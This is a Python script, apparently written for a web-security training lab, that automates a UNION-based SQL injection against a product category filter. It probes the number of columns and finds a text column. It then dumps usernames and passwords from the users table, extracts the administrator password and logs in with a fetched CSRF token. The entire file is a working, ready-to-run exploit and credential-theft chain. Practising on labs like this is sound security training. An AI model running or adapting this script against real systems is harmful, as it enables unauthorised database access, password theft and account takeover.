import sys
import requests
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# if u want to use burp suite as proxy to see all requests. Default on.
use_proxy = True
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
path = "filter?category=Gifts"
login_path = "login"


def find_column_number(url: str) -> int:
    """
    Exploit SQL injection to figure out number of columns
    :param url: url to exploit
    :return: number of columns
    """
    for i in range(1, 50):
        sql_payload = f"'+ORDER+BY+{i}--"
        if use_proxy:
            request_to_server = requests.get(
                url + path + sql_payload, verify=False, proxies=proxy
            )
        else:
            request_to_server = requests.get(url + path + sql_payload)
        if request_to_server.status_code == 500:
            return i - 1
    return 0


def find_string_column(url: str, number_of_columns: int) -> int:
    """
    Find column that contains string
    :param url: url to exploit
    :param number_of_columns: number of columns
    :return: column that contains string
    """
    payload_string = "'a'"
    print(f"[+] finding  {payload_string} in results")
    for column in range(1, number_of_columns + 1):
        payload_list = ["NULL"] * number_of_columns
        payload_list[column - 1] = payload_string
        sql_payload = f"'+UNION+SELECT+{','.join(payload_list)}--"
        if use_proxy:
            response = requests.get(
                url + path + sql_payload, verify=False, proxies=proxy
            )
        else:
            response = requests.get(url + path + sql_payload)
        if "Internal Server Error" not in response.text:
            return column
    return 0


def collect_html_with_database(url: str, colum_number: int, exploit_column: int) -> str:
    """
    Exploit database to get all users
    :param url: url to exploit
    :param colum_number: number of columns
    :param exploit_column: column that contains string
    :return: html with database
    """
    payload_columns = ["NULL"] * colum_number
    payload_columns[exploit_column - 1] = "username||'~'||password"
    payload_string = ",".join(payload_columns)
    payload_to_get_full_table = f"'+UNION+SELECT+{payload_string}+FROM+users--"
    if use_proxy:
        response = requests.get(
            url + path + payload_to_get_full_table, verify=False, proxies=proxy
        )
    else:
        response = requests.get(url + path + payload_to_get_full_table)
    return response.text


def find_administrator_password(html: str) -> str:
    """
    Find administrator password
    :param html: html with database
    :return: administrator password
    """
    soup = BeautifulSoup(html, "html.parser")
    list_with_password = soup.find_all("th")
    string_with_password = ""
    for string in list_with_password:
        if "administrator" in str(string):
            string_with_password = str(string)
    start = string_with_password.find("~") + 1
    finish = string_with_password.rfind("<")
    password = string_with_password[start:finish]
    print(f"[+] password is found it {password}")
    return password


def create_csrf_token(session: requests.Session, url: str) -> str:
    """
    Create csrf token
    :param session: requests.Session()
    :param url: url
    :return: csrf token
    """
    if use_proxy:
        request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
    else:
        request_to_get_csrf_token = session.get(url)
    soup = BeautifulSoup(request_to_get_csrf_token.text, "html.parser")
    csrf_token = soup.find("input")["value"]
    return csrf_token


def log_in_as_admin(url: str, password: str) -> bool:
    """
    Log in as administrator
    :param url: url to exploit
    :param password: administrator password
    :return: True if login successful
    """
    session = requests.Session()
    csrf_token = create_csrf_token(session, url + login_path)
    data = {"csrf": csrf_token, "username": "administrator", "password": password}
    if use_proxy:
        request_to_login = session.post(
            url + login_path, data=data, verify=False, proxies=proxy
        )
    else:
        request_to_login = session.post(url + login_path, data=data)
    return request_to_login.status_code == 200


def main() -> None:
    """
    Main function
    """
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)
    print("[-] Figuring out number of columns... please wait")
    number_of_columns = find_column_number(url)
    if number_of_columns:
        print(f"[+] SQL injections successful. Numbers of columns: {number_of_columns}")
        print("[+] Figuring out which columns contains text... please wait")
        string_column = find_string_column(url, number_of_columns)
        if string_column:
            print(f"[+] The column that contains text is {string_column}")
            print("[+] start exploit the database users...")
            html_with_database = collect_html_with_database(
                url, number_of_columns, string_column
            )
            if html_with_database is not None:
                print(
                    "[+] Database was successfully downloaded. Find the administrator password..."
                )
                administrator_password = find_administrator_password(html_with_database)
                if administrator_password:
                    print(f"[+] Trying to login as administrator...")
                    if log_in_as_admin(url, administrator_password):
                        print(f"[+] Full sql injections was successful")
        else:
            print("[-] We were not able to find a column that has a string data type")
    else:
        print("[-] SQL injections unsuccessful")


if __name__ == "__main__":
    main()
